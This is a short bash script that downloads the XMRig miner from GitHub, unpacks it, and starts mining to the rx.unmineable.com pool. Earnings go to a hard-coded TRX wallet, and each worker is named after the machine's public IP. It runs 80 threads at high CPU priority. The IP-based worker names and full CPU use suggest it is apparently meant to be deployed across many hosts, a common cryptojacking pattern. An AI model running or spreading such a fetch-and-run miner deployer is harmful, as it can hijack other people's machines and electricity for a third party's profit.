#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u TRX:TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
